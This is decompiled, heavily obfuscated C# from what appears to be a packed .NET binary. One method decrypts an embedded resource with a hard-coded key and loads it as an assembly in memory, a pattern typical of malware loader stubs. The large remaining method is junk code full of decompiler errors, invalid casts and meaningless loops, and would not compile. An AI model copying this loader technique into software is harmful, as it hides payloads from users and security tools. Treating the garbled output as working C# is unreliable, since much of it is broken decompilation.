using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Globalization;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text;
using ns1;

namespace ns0;

internal sealed class Class2 : Component
{
	public static void smethod_0()
	{
		Class0.smethod_1(Control1.appDomain_0);
		smethod_2();
	}

	private static byte[] smethod_1(string string_0)
	{
		byte[] array = new byte[string_0.Length * 2];
		Buffer.BlockCopy(string_0.ToCharArray(), 0, array, 0, array.Length);
		return array;
	}

	internal static void smethod_2()
	{
		Control1.assembly_0 = Assembly.Load(Control3.smethod_1(Resources.Byte_0, smethod_1("/*=+-)")));
	}

	unsafe static void imozagaj4()
	{
		//IL_0019: Expected O, but got I4
		//IL_001e: Expected Void, but got O
		//IL_002e: Expected O, but got I4
		//IL_0050: Expected O, but got I4
		//IL_00c5: Expected O, but got I4
		//IL_00e4: Expected O, but got I4
		//IL_00ea: Expected I4, but got O
		//IL_00f3: Expected O, but got I4
		//IL_0105: Expected O, but got I4
		//IL_014f: Expected O, but got I4
		//IL_0153: Unknown result type (might be due to invalid IL or missing references)
		//IL_015b: Expected I4, but got Unknown
		//IL_0188: Expected O, but got I4
		//IL_019d: Expected O, but got I4
		//IL_01cb: Expected O, but got I4
		//IL_0203: Expected O, but got I4
		//IL_0228: Expected O, but got I4
		//IL_0232: Expected O, but got I4
		//IL_0241: Expected O, but got I4
		//IL_024d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0255: Expected Ref, but got Unknown
		//IL_025d: Expected O, but got I4
		//IL_027e: Expected O, but got I4
		//IL_0294: Expected O, but got I4
		//IL_029a: Unknown result type (might be due to invalid IL or missing references)
		//IL_029b: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a8: Expected O, but got I4
		//IL_02b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_02d6: Expected O, but got I4
		//IL_02da: Unknown result type (might be due to invalid IL or missing references)
		//IL_02e0: Unknown result type (might be due to invalid IL or missing references)
		//IL_0303: Unknown result type (might be due to invalid IL or missing references)
		//IL_032d: Expected O, but got I4
		//IL_0331: Unknown result type (might be due to invalid IL or missing references)
		//IL_0332: Unknown result type (might be due to invalid IL or missing references)
		//IL_0333: Unknown result type (might be due to invalid IL or missing references)
		//IL_0355: Expected I4, but got Unknown
		//IL_0356: Expected O, but got I4
		//IL_0384: Expected O, but got I4
		//IL_03d8: Expected O, but got I4
		//IL_040e: Expected O, but got I4
		//IL_0412: Unknown result type (might be due to invalid IL or missing references)
		//IL_0434: Expected O, but got I4
		//IL_0438: Unknown result type (might be due to invalid IL or missing references)
		//IL_043b: Unknown result type (might be due to invalid IL or missing references)
		//IL_043c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0459: Expected O, but got I4
		//IL_0462: Expected I4, but got O
		//IL_0478: Expected O, but got I4
		//IL_04a0: Expected O, but got I4
		//IL_04ac: Expected O, but got I4
		//IL_04b2: Expected I4, but got O
		//IL_04c3: Unknown result type (might be due to invalid IL or missing references)
		//IL_04c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_04cf: Expected Ref, but got Unknown
		//IL_0512: Expected O, but got I4
		//IL_051e: Expected O, but got I4
		//IL_052d: Expected O, but got I4
		//IL_0539: Expected O, but got I4
		//IL_054e: Expected O, but got I4
		//IL_0553: Unknown result type (might be due to invalid IL or missing references)
		//IL_0554: Unknown result type (might be due to invalid IL or missing references)
		//IL_0555: Unknown result type (might be due to invalid IL or missing references)
		//IL_0557: Expected I4, but got Unknown
		//IL_055b: Incompatible stack heights: 0 vs 1
		//IL_0577: Expected O, but got I4
		//IL_0583: Expected O, but got I4
		//IL_058e: Expected I4, but got O
		//IL_058f: Expected O, but got I4
		//IL_059f: Expected O, but got I4
		//IL_05b3: Expected O, but got I4
		//IL_05c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_05cc: Expected Ref, but got Unknown
		//IL_05cd: Expected O, but got I4
		//IL_05f4: Expected O, but got I4
		//IL_0657: Expected O, but got I4
		//IL_0660: Expected I4, but got O
		//IL_0661: Expected O, but got I4
		//IL_066b: Expected O, but got I4
		//IL_0683: Expected O, but got I4
		//IL_068d: Expected O, but got I4
		//IL_0698: Expected I4, but got O
		//IL_0699: Expected O, but got I4
		//IL_06a8: Expected O, but got I4
		//IL_06d4: Expected O, but got I4
		//IL_06df: Expected O, but got I4
		//IL_06e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_06eb: Unknown result type (might be due to invalid IL or missing references)
		//IL_06f9: Expected O, but got I4
		//IL_0702: Expected I4, but got O
		//IL_0702: Expected I4, but got Unknown
		//IL_073a: Expected O, but got I4
		//IL_0761: Expected O, but got I4
		//IL_078b: Expected O, but got I4
		//IL_079c: Expected O, but got I4
		//IL_07b2: Expected O, but got I4
		//IL_07e7: Expected O, but got I4
		//IL_0842: Expected O, but got I4
		//IL_0884: Expected O, but got I4
		//IL_08a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_08a9: Expected Ref, but got Unknown
		//IL_08aa: Expected O, but got I4
		//IL_08b4: Expected O, but got I4
		//IL_08c2: Expected O, but got I4
		//IL_08d5: Expected O, but got I4
		//IL_08de: Expected I4, but got O
		//IL_08df: Expected O, but got I4
		//IL_090f: Expected O, but got I4
		//IL_091b: Expected O, but got I4
		//IL_0938: Expected O, but got I4
		//IL_096d: Expected O, but got I4
		//IL_098b: Expected O, but got I4
		//IL_09c4: Expected O, but got I4
		//IL_09e8: Expected O, but got I4
		//IL_09f6: Expected O, but got I4
		//IL_0a52: Expected O, but got I4
		//IL_0a6c: Expected O, but got I4
		//IL_0a75: Expected I4, but got O
		//IL_0a76: Expected O, but got I4
		//IL_0a7c: Expected I4, but got O
		//IL_0aad: Expected O, but got I4
		//IL_0ab7: Expected O, but got I4
		//IL_0ad8: Expected O, but got I4
		//IL_0b26: Expected O, but got I4
		//IL_0b4f: Expected O, but got I4
		System.Runtime.CompilerServices.Unsafe.SkipInit(out byte[] array);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out bool flag);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out object obj4);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out int num9);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out char[] array2);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out StringSplitOptions options);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out NumberStyles numberStyles);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out CultureInfo cultureInfo);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out IFormatProvider formatProvider);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out ref byte reference2);
		void @void;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out byte b);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out ResolveEventArgs resolveEventArgs);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out string text);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out StringComparison stringComparison);
		try
		{
			try
			{
				bool num;
				do
				{
					@void = default(void);
					object obj = ((byte*)205)->GetHashCode();
					@void = ((obj is void) ? obj : null);
					@void = @void;
					array = array;
					num = (byte)Control3.smethod_1(array, byte.Parse("ASVWERFL") as byte[]) != 0;
					flag = num;
				}
				while (num);
			}
			catch
			{
				System.Runtime.CompilerServices.Unsafe.SkipInit(out byte[] byte_);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out string text2);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out byte b2);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out byte b3);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out string text3);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out string text5);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out int num10);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out string text6);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out string text7);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out string strA2);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out byte b4);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out int num15);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out NumberStyles numberStyles2);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out string s);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out IEnumerable<_0021_00210> enumerable);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out object object_);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out CultureInfo cultureInfo2);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out CultureInfo culture2);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out string text8);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out byte b5);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out string text9);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out byte b6);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out string s2);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out bool flag2);
				do
				{
					b = b;
					byte num2 = b;
					text = Control2.smethod_0(null) as string;
					string strA = text;
					string strB = text;
					array = null;
					int num3 = (int)Control3.smethod_1(byte_, array);
					_ = (int)Settings.Default;
					byte[] byte_2 = array;
					byte num4 = b;
					text = "HNOPZXNQI";
					int num5 = (int)Control3.smethod_1(byte_2, (byte[])(object)((byte*)num4)->ToString(text2, null));
					text = "NTH";
					text = text;
					byte num6 = b;
					int num7 = checked(b - b);
					byte num8 = b;
					b = 41;
					object obj2 = ((byte*)checked(num8 + b2))->GetTypeCode();
					object obj3 = ((obj2 is byte) ? obj2 : null);
					obj4 = string.Intern(text);
					object obj5 = ((byte*)212)->CompareTo(obj4);
					b = (byte)checked(obj3 - ((obj5 is byte) ? obj5 : null));
					string obj6 = ((byte*)checked(unchecked((uint)num7) - unchecked((uint)b3)))->GetTypeCode() as string;
					string value = text;
					stringComparison = stringComparison;
					text = obj6.LastIndexOf(value, stringComparison) as string;
					text = text3;
					string text4 = text;
					num9 = (int)checked(unchecked((uint)(int)((string)text.Clone()).Trim()) + unchecked((uint)num9));
					ref _003F reference = ref *(_003F*)num6;
					object obj7 = ((byte*)(byte)Settings.Default)->Equals(150);
					_ = System.Runtime.CompilerServices.Unsafe.As<_003F, byte>(ref reference).CompareTo(Class4.smethod_0(text5.Remove(-797091750, text4.IndexOf('惦', checked(num10 + ((obj7 is int) ? obj7 : null)), num9)), (ResolveEventArgs)(object)text.PadRight(num9, 'ᒹ'))) is char[];
					byte num11 = b;
					_ = (string)(object)Control3.smethod_1(((byte*)88)->Equals(105) as byte[], array);
					text = "DUZXM";
					array2 = ((byte*)num11)->CompareTo((byte)text6.Remove(-1724502986)) as char[];
					char[] separator = array2;
					uint num12 = (uint)b / 170u;
					resolveEventArgs = resolveEventArgs;
					options = (StringSplitOptions)((byte*)num12)->ToString(string.Equals("ATMNO", (string)(object)Class4.smethod_0(null, resolveEventArgs), (StringComparison)Control3.smethod_1(array, array)) as IFormatProvider);
					object obj8 = (((byte*)(byte)text7.Split(separator, options))->CompareTo(byte.Parse(text, null) as object) as string).IndexOf('➇');
					object obj9 = ((obj8 is byte) ? obj8 : null);
					b = 27;
					object obj10 = string.IsNullOrEmpty((string)(object)Class4.smethod_0(string.Compare(strA2, ((byte*)checked(obj9 * b4))->CompareTo(obj4), (string)(object)Control3.smethod_1(byte.Parse(text) as byte[], null), 411655935, 753435112, stringComparison) as object, resolveEventArgs));
					_003F val;
					checked
					{
						_ = unchecked(num5 / checked(((obj10 is int) ? obj10 : null) * num9)) * unchecked((int)Class4.smethod_0(obj4, (text == text) as ResolveEventArgs));
						num9 = num9;
						uint num13 = unchecked((uint)num9) + unchecked((uint)(int)Control3.smethod_1(null, null));
						object obj11 = text.Contains(text);
						val = num13 - ((obj11 is int) ? obj11 : null) - 1481481050;
					}
					int num14 = (int)Control3.smethod_1(null, null);
					num9 = (int)(checked(3609017132u * 1110717141u) / 3028317408u);
					_003F val2 = val / ((uint)num14 / (uint)num15);
					text = text;
					numberStyles = numberStyles;
					numberStyles = numberStyles2;
					numberStyles = default(NumberStyles);
					object obj12 = byte.TryParse(s, numberStyles, (IFormatProvider)(object)Settings.Default, out *(byte*)null);
					_003F val3 = checked(1238000235 - num3 * (val2 + ((obj12 is int) ? obj12 : null)));
					cultureInfo = cultureInfo;
					CultureInfo culture = cultureInfo;
					CompareOptions compareOptions = default(CompareOptions);
					string strA3 = string.Compare(strA, -1551757965, strB, 229961961, (int)val3, culture, default(CompareOptions)) as string;
					formatProvider = formatProvider;
					obj4 = string.Format(formatProvider, (string)(object)text.Split((char[])(object)string.Concat<T>((IEnumerable<T>)(((byte*)(byte)((byte*)2862)->ToString(formatProvider))->Equals(null) as IEnumerable<_0021_00210>))), obj4);
					string separator2 = text;
					enumerable = enumerable;
					string strB2 = "KVUTCBNMG".Remove(((string)(object)Class4.smethod_0(object_, (ResolveEventArgs)(object)string.Join<T>(separator2, (IEnumerable<T>)enumerable))).CompareTo(((byte*)(byte)Settings.Default)->GetHashCode() as string));
					int hashCode = ((byte*)(byte)string.Join(text, (string?[])null))->GetHashCode();
					cultureInfo = cultureInfo;
					cultureInfo = cultureInfo2;
					object obj13 = string.Compare(strA3, -1600657150, strB2, -1912949793, hashCode, ignoreCase: true, culture2);
					_003F val4 = num2 / ((obj13 is byte) ? obj13 : null);
					text = text;
					byte num16 = (byte)((byte*)82)->ToString(text8, formatProvider);
					object obj14 = ((byte*)27)->CompareTo(obj4);
					_003F val5;
					checked
					{
						val5 = val4 + unchecked(checked(num16 + ((obj14 is byte) ? obj14 : null)) / 27);
					}
					b = (byte)Settings.Default;
					b = b5;
					text = text;
					object obj15 = string.IsNullOrEmpty(text);
					_ = (byte)text9.Remove((int)((obj15 is int) ? obj15 : null));
					b = b;
					object obj16 = ((byte*)((uint)b6 / 219u))->GetHashCode();
					object obj17 = ((obj16 is byte) ? obj16 : null);
					object obj18 = text.StartsWith(((byte*)checked(unchecked((uint)(byte)text.ToLowerInvariant()) * 94u))->CompareTo(92) as string, stringComparison);
					numberStyles = (NumberStyles)((obj18 is NumberStyles) ? obj18 : null);
					_ = (byte)((byte*)(byte)((byte*)(val5 / checked(obj17 + byte.Parse("JSLYZS", default(NumberStyles), formatProvider))))->ToString("LJGWLF"))->ToString("TQOUJFCY", formatProvider);
					byte num17 = b;
					uint num18 = (uint)checked(byte.Parse(text, formatProvider) + b) / 158u;
					text = ((byte*)102)->ToString();
					object obj19 = Control2.smethod_0((ResolveEventArgs)(object)string.Concat(byte.Parse(byte.TryParse(s2, out *(byte*)null) as string, numberStyles) as object, ((byte*)/*isinst with value type is only supported in some contexts*/)->Equals(obj4) as object, (object)null, (object)__arglist()));
					b = (byte)(int)checked(num17 + (num18 - 7525 * unchecked((object)null / ((obj19 is byte) ? obj19 : null))));
					flag = false;
				}
				while (flag2);
			}
		}
		catch
		{
			while (true)
			{
				string s3 = string.Format(null, text, obj4);
				object obj21 = Control2.smethod_0(resolveEventArgs);
				if (string.Compare(byte.TryParse(s3, (NumberStyles)((obj21 is NumberStyles) ? obj21 : null), Control2.smethod_0(resolveEventArgs) as IFormatProvider, out reference2) as string, "AQN", flag) is bool)
				{
					string s4 = text;
					reference2 = ref reference2;
					object obj22 = byte.TryParse(s4, out reference2);
					_ = (byte)Class4.smethod_0(((byte*)(((obj22 is byte) ? obj22 : null) / (byte)((byte*)252)->ToString()))->GetTypeCode() as object, null);
					continue;
				}
				break;
			}
		}
		@void = default(void);
		try
		{
			_ = text.LastIndexOfAny(null) is Struct1;
		}
		catch
		{
			while (flag)
			{
			}
		}
		System.Runtime.CompilerServices.Unsafe.SkipInit(out string text10);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out string text12);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out string text13);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out ResolveEventArgs resolveEventArgs_);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out Struct1 @struct);
		while (flag)
		{
			do
			{
				try
				{
					text = text;
					text = text10;
				}
				finally
				{
					string text11 = text;
					text = "SRRHQM";
					string[] separator3 = null;
					string s5 = text;
					object obj25 = ((byte*)/*isinst with value type is only supported in some contexts*/)->GetHashCode();
					text = byte.TryParse(s5, (NumberStyles)((obj25 is NumberStyles) ? obj25 : null), ((byte*)(byte)Class4.smethod_0(null, null))->CompareTo(Control2.smethod_0(resolveEventArgs) as object) as IFormatProvider, out reference2) as string;
					string s6 = (string)(object)text12.Split(separator3, ((byte*)131)->CompareTo(text13.LastIndexOfAny(null) as object), options);
					numberStyles = default(NumberStyles);
					string value2 = ((byte*)byte.Parse(s6, numberStyles, formatProvider))->GetHashCode() as string;
					int startIndex = checked(/*isinst with value type is only supported in some contexts*/ - -1924549275 + num9);
					object obj26 = Control2.smethod_0(resolveEventArgs);
					resolveEventArgs = (ResolveEventArgs)(object)text11.Substring("MZP".LastIndexOf(value2, startIndex, -1352188276, (StringComparison)((obj26 is StringComparison) ? obj26 : null)));
					@struct = (Struct1)Class4.smethod_0(null, resolveEventArgs_);
					@struct = @struct;
					continue;
				}
			}
			while (checked(1u * (flag ? 1u : 0u)) != 0);
		}
		System.Runtime.CompilerServices.Unsafe.SkipInit(out Class1 @class);
		try
		{
			try
			{
			}
			finally
			{
				_ = Control2.smethod_0(null) is Class1;
				uint num19 = (uint)(byte)Settings.Default / 79u;
				string text14 = text;
				formatProvider = formatProvider;
				System.Runtime.CompilerServices.Unsafe.SkipInit(out IFormatProvider formatProvider2);
				@class = string.IsNullOrEmpty(((byte*)num19)->ToString(text14, formatProvider2)) as Class1;
				System.Runtime.CompilerServices.Unsafe.SkipInit(out Class1 class2);
				@class = class2;
				@class = null;
				byte num20 = b;
				text = text;
				System.Runtime.CompilerServices.Unsafe.SkipInit(out string text15);
				((byte*)num20)->ToString(text15, formatProvider);
				b = b;
				b = b;
				System.Runtime.CompilerServices.Unsafe.SkipInit(out byte b7);
				_ = ((byte*)b7)->CompareTo(b) is Control0;
				goto end_IL_0730;
			}
			end_IL_0730:;
		}
		catch
		{
			_ = ((byte*)b)->GetHashCode() is Class3;
		}
		while (flag)
		{
		}
		try
		{
			_ = byte.Parse("ER") is string;
			_ = (string)(object)Settings.Default;
			text = "Z";
			text = text;
		}
		finally
		{
			try
			{
				try
				{
					@struct = @struct;
				}
				catch
				{
					_ = string.Equals(text, "KEXDRQDBU", stringComparison) is string;
				}
			}
			catch
			{
				while (true)
				{
					_ = (string)(object)text.Split(array2, num9, options);
				}
			}
			goto IL_0808;
		}
		IL_0808:
		try
		{
			@class = @class;
			string strA4 = ((byte*)byte.Parse(text, formatProvider))->ToString(formatProvider);
			int indexA = num9;
			text = "ZMLHPKBL";
			System.Runtime.CompilerServices.Unsafe.SkipInit(out string strB3);
			_ = string.Compare(strA4, indexA, strB3, 1410693270, 750552088, default(StringComparison)) is void;
			Class0 class3 = class3;
			@struct = @struct;
		}
		catch
		{
			string strA5 = text.Trim();
			string text16 = text;
			stringComparison = default(StringComparison);
			object obj30 = "MY".StartsWith("ZQEHIJUQR", default(StringComparison));
			object obj31 = ((obj30 is byte) ? obj30 : null);
			string s7 = text;
			numberStyles = numberStyles;
			System.Runtime.CompilerServices.Unsafe.SkipInit(out NumberStyles style);
			string strB4 = (text16 == ((byte*)checked(obj31 - (byte.Parse(s7, style) + unchecked((byte)string.Join(text, (string?[])null)))))->GetTypeCode() as string) as string;
			CultureInfo culture3 = byte.TryParse(text, out reference2) as CultureInfo;
			object obj32 = byte.Parse("G", numberStyles, formatProvider);
			_ = string.Compare(strA5, strB4, culture3, (CompareOptions)((obj32 is CompareOptions) ? obj32 : null)) is byte;
		}
		try
		{
			try
			{
				System.Runtime.CompilerServices.Unsafe.SkipInit(out Control3 control);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out ref byte result);
				while (flag)
				{
					_ = (Class1)(object)((byte*)(byte)Class4.smethod_0(obj4, resolveEventArgs))->ToString();
					Control3 obj34 = byte.Parse("DRNBW".IsNormalized() as string, numberStyles) as Control3;
					control = control;
					control = obj34;
					@class = null;
					reference2 = ref *(byte*)null;
					_ = byte.TryParse("VQ", out result) is Struct2;
				}
			}
			finally
			{
				@void = @void;
				goto end_IL_08e7;
			}
			end_IL_08e7:;
		}
		catch
		{
			try
			{
				b = (byte)((uint)(byte)Settings.Default / 197u);
			}
			catch
			{
				_ = ((byte*)248)->Equals(null) is byte;
			}
			finally
			{
				System.Runtime.CompilerServices.Unsafe.SkipInit(out NormalizationForm normalizationForm);
				System.Runtime.CompilerServices.Unsafe.SkipInit(out string text17);
				while ((byte)string.Format(((string)(object)Settings.Default).EndsWith((string)(object)Control3.smethod_1(array, (byte[])(object)((string)(object)Settings.Default).ToUpper())) as string, obj4) != 0)
				{
					text = text;
					normalizationForm = normalizationForm;
					_003CModule_003E _003CModule_003E = text17.IsNormalized(normalizationForm) as _003CModule_003E;
					_003CModule_003E = _003CModule_003E;
				}
				goto end_IL_094b;
			}
			end_IL_094b:;
		}
		b = 216;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out byte b8);
		resolveEventArgs = ((byte*)b8)->GetTypeCode() as ResolveEventArgs;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out ResolveEventArgs resolveEventArgs_2);
		text = Control2.smethod_0(resolveEventArgs_2) as string;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out string format);
		_ = (byte)string.Format(format, obj4, obj4, null);
		try
		{
		}
		catch
		{
			System.Runtime.CompilerServices.Unsafe.SkipInit(out bool ignoreCase);
			System.Runtime.CompilerServices.Unsafe.SkipInit(out string text19);
			System.Runtime.CompilerServices.Unsafe.SkipInit(out string text20);
			string strA6;
			System.Runtime.CompilerServices.Unsafe.SkipInit(out string value4);
			System.Runtime.CompilerServices.Unsafe.SkipInit(out StringComparison comparisonType);
			int indexA2;
			System.Runtime.CompilerServices.Unsafe.SkipInit(out byte[] byte_3);
			System.Runtime.CompilerServices.Unsafe.SkipInit(out ResolveEventArgs resolveEventArgs_3);
			System.Runtime.CompilerServices.Unsafe.SkipInit(out string strB6);
			do
			{
				string text18 = text;
				text = text;
				_ = (string)(object)Settings.Default;
				text = "DJEZLVTMC";
				_ = (StringComparison)text.ToLowerInvariant();
				string strB5 = text;
				flag = flag;
				text = string.Compare("RYA", strB5, ignoreCase, cultureInfo) as string;
				text = text19;
				text = text;
				string value3 = text;
				object obj37 = byte.Parse(text);
				object obj38 = text20.IndexOf(value3, (int)((obj37 is int) ? obj37 : null));
				stringComparison = (StringComparison)((obj38 is StringComparison) ? obj38 : null);
				StringComparison stringComparison2 = default(StringComparison);
				stringComparison = default(StringComparison);
				stringComparison = (StringComparison)Class4.smethod_0(obj4, (ResolveEventArgs)(object)Settings.Default);
				strA6 = string.Compare("EMD", text18.Equals(value4, comparisonType) as string) as string;
				array = array;
				indexA2 = (int)Control3.smethod_1(byte_3, array);
				object object_2 = obj4;
				resolveEventArgs = resolveEventArgs;
				text = (string)(object)Class4.smethod_0(object_2, Control2.smethod_0(resolveEventArgs_3) as ResolveEventArgs);
			}
			while (string.CompareOrdinal(strA6, indexA2, strB6, 1187517477, (int)checked(3038976414u * (4268614837u * 1675821344u * unchecked((uint)(int)Class4.smethod_0(obj4, (ResolveEventArgs)(object)Class4.smethod_0(null, resolveEventArgs)) / 1013968720u)))) is bool);
		}
		_ = byte.Parse((string)(object)Class4.smethod_0(obj4, resolveEventArgs), (IFormatProvider)(object)Settings.Default) is void;
	}
}
